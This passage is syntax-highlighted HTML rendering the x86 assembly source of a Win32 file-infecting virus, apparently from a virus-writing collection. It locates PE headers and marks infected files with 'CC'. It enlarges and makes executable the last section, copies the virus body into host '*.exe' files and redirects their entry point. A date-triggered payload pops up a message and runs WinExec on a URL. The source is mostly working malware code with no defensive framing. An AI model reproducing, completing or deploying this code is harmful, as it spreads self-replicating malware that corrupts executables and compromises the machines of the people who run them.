         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">            
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">unmap</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc12">'CC'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">PE_SEE2</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">unmap</span><span class="sc0">
</span><span class="sc5">PE_SEE2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hosteip</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileAlignment</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0"> 
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">00000020h</span><span class="sc0">     
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">20000000h</span><span class="sc0">       
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0"> 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldRawDataSize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">  
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc5">virussize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileAlignment</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileAlignment</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewRawDataSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> 
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virussize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewHostEip</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldRawDataSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewRawDataSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">IncRawDataSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewRawDataSize</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewHostSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virussize</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mapaddy</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virussize</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
     
      
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc12">'CC'</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewHostEip</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">IncRawDataSize</span><span class="sc4">]</span><span class="sc0"> 
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">unmap</span><span class="sc4">:</span><span class="sc0"> 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mapaddy</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AUnmapViewOfFileA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">closemap</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACloseHandleA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">closeshop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewHostSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">
          
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ASetFilePointerA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ASetEndOfFileA</span><span class="sc4">]</span><span class="sc0"> 
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">closeshop2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACloseHandleA</span><span class="sc4">]</span><span class="sc0">           
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FINDNEXTFILE</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OLDSEH</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">curdir</span><span class="sc4">]</span><span class="sc0"> 
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ASetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimeStruc</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimeStruc</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AGetSystemTimeA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">edi.Wday</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">okgonenow</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WinTitle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AMsgBoxA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">URL</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AWinExecA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">okgonenow</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">terminater</span><span class="sc0">
      </span><span class="sc1">;**************INFECTION DATA***************************</span><span class="sc0">
</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OLDSEH</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exest</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maphandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">netfile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'open'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Oldeip</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">newdir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NeoFileSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileNameOffset</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FHANDLE</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">curdir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">curdir2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">curdir3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc10">memory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mapaddy</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">OldRawDataSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NewRawDataSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">IncRawDataSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileAlignment</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NewHostEip</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">virussize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">endgame</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">NewHostSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">stuffhost</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">hosteip</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">imagebase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">stuffhost2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">hosteip2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">imagebase2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;**************Find records*************************</span><span class="sc0">
</span><span class="sc5">max_path</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">

</span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">  </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">win32_find_data</span><span class="sc0">         </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">FileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreationTime</span><span class="sc0">   </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LastAccessTime</span><span class="sc0"> </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LastWriteTime</span><span class="sc0">  </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileSizeHigh</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileSizeLow</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
